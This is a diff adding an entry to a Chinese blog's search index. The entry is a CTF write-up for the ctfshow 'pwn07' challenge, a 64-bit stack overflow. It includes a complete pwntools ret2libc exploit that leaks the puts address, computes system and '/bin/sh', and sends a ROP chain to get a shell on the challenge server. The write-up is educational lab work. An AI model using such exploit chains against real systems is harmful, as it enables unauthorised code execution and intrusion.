@@ -1,6 +1,44 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ctfhsow-pwn07</title>
+    <url>/%E6%A0%88%E6%BA%A2%E5%87%BA/ctfhsow-pwn07/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写过一篇32位的libc题，现在记一篇64位的</p>
+<p><a href="https://sm.ms/image/UBc8sIjPKD1YxML" target="_blank"><img src="https://s2.loli.net/2022/03/04/UBc8sIjPKD1YxML.jpg" ></a></p>
+<span id="more"></span>
+
+<h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p><a href="https://sm.ms/image/1WTG2CkiVRpLUPh" target="_blank"><img src="https://s2.loli.net/2022/03/04/1WTG2CkiVRpLUPh.png" ></a></p>
+<p>明显栈溢出，思路与之前一样先得到libc版本，推算出<code>system</code>和<code>/bin/sh</code>的地址</p>
+<p>此时要注意64位要返回地址是<code>pop rdi；red</code> ,因为64位程序要考虑堆栈平衡。</p>
+<p><a href="https://sm.ms/image/F189d4gm2o5iIkK" target="_blank"><img src="https://s2.loli.net/2022/03/04/F189d4gm2o5iIkK.png" ></a></p>
+<p><a href="https://sm.ms/image/yeBMSjRbJDx3kpW" target="_blank"><img src="https://s2.loli.net/2022/03/04/yeBMSjRbJDx3kpW.png" ></a></p>
+<p>由此得到EXP</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28195</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006e3</span></span><br><span class="line">pop_ret = <span class="number">0x4004c6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xC</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
+
+
+<p>根据打印出来的结果的后三位</p>
+<p><a href="https://sm.ms/image/TqEbROHDvkQGdyn" target="_blank"><img src="https://s2.loli.net/2022/03/04/TqEbROHDvkQGdyn.png" ></a></p>
+<p><a href="https://sm.ms/image/hV4NFAnsgrxOP8k" target="_blank"><img src="https://s2.loli.net/2022/03/04/hV4NFAnsgrxOP8k.png" ></a></p>
+<p>由此得到后半部分</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x0809c0</span></span><br><span class="line">system = libc_base + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28195</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006e3</span></span><br><span class="line">pop_ret = <span class="number">0x4004c6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xC</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - <span class="number">0x0809c0</span></span><br><span class="line">system = libc_base + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p><a href="https://sm.ms/image/amOwYXnv6lJVIco" target="_blank"><img src="https://s2.loli.net/2022/03/04/amOwYXnv6lJVIco.png" ></a></p>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>WP</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow-pwn04</title>
     <url>/%E6%A0%88%E6%BA%A2%E5%87%BA/ctfshow-pwn04/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每日一题</p>
